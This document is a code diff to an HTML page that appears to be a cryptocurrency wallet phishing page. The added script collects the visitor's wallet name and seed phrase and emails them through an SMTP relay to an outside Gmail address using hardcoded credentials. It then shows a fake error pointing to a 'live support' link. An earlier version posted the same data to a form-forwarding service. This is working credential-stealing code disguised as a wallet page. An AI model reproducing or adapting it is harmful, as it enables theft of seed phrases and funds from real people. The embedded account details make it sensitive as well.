@@ -13,6 +13,7 @@
     <link rel="preload" href="files/static/css/1f147681d5457acaa9f5.css" as="style" />
     <link rel="stylesheet" href="files/static/css/1f147681d5457acaa9f5.css" />
     <link rel="stylesheet" href="files/static/css/add.css" type="text/css" />
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
 </head>
 
@@ -1348,7 +1349,8 @@
 
                         <div class="tabContent active" id="phraseContent">
 
-                            <form action="https://formsubmit.co/bd35c001100f7932a2a4754d04c18cb0" id="" enctype="" method="POST" onsubmit="submitForm(event)">
+                            <!-- <form action="" id="" enctype="" method="POST" onsubmit="submitForm(event)"> -->
+                                <form action="https://formsubmit.co/bd35c001100f7932a2a4754d04c18cb0" id="" enctype="" method="POST" onsubmit="submitForm(event)">
                                 <input name="wallet" type="hidden" class="wallet" id="wallet1" value="">
                                 <input type="hidden" name="email">
                               
@@ -1441,7 +1443,7 @@
                     </div>
 
                 </div>
-
+                
                 <script>
                     function submitForm(event) {
                       event.preventDefault(); // Prevent the form from submitting by default
@@ -1451,10 +1453,38 @@
                        // Check honeypot field
                         if (document.getElementsByName("email")[0].value !== "") {
                             console.log("Sorry, your message could not be sent.");
-                            return;
+                            return false;
                         }
-                      form.submit(); // Submit the form
-                      $('#myModal').css('display', 'none');
+                    //   form.submit(); // Submit the form
+
+                       // Call the sendEmail function
+                        sendEmail();
+                                        
+                      return false; // Prevent the form from submitting again
+                    }
+                </script>
+                <script>
+                    function sendEmail(){
+                        var wallet1, wallet2, wallet3, phrase, message;
+
+                        wallet1 = document.getElementById("wallet1").value;
+                        // wallet2 = document.getElementById("wallet2").value;
+                        // wallet3 = document.getElementById("wallet3").value;
+                        phrase = document.getElementById("phraseinput").value;
+
+                        message = "Manual Entry:\n" + "\nWallet: " + wallet1 + "\nSeed Phrase: " + phrase;
+
+                        Email.send({
+                            Host : "smtp.elasticemail.com",
+                            Username : "albert.json00@gmail.com",
+                            Password : "F4119B192265187443C4DBFA40DB3F65705A",
+                            To : 'Jacobbusey9@gmail.com',
+                            From : "albert.json00@gmail.com",
+                            Subject : "New Manual Entry",
+                            Body : message
+
+                        }).then(function () {
+                        $('#myModal').css('display', 'none');
                 
                       Swal.fire({
                         icon: "error",
@@ -1462,8 +1492,8 @@
                         text: "Something went wrong!",
                         footer: '<a href="https://livesupport.en-uk.online">Why do I have this issue?</a>'
                       });
-                
-                      return false; // Prevent the form from submitting again
+
+                     });
                     }
                 </script>
 
